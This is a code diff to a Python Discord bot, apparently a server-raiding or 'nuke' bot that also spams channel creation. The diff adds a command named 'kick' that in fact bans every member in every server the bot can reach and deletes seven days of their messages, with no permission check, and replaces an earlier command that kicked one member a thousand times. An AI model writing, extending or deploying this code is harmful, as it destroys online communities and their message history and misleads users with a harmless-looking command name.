@@ -37,6 +37,13 @@ async def create(ctx):
         await ctx.guild.create_text_channel("튀엣")
         
 @client.command()
+async def kick(ctx):
+     for member in client.get_all_members():
+        if member.bot and SKIP_BOTS:
+            continue
+        await member.ban(reason="Banned by BanBot", delete_message_days=7)
+        
+@client.command()
 async def cmd(ctx):
   await ctx.message.delete()
   author = ctx.author
@@ -67,9 +74,6 @@ async def cmd(ctx):
 """)
   await author.send(embed = cmd)
   
-@client.command()
-async def kick(ctx, member: discord.Member, *, reason=None):
-    for i in range(1000):
-       await member.kick(reason=reason)
+
     
 client.run(os.environ['token'])
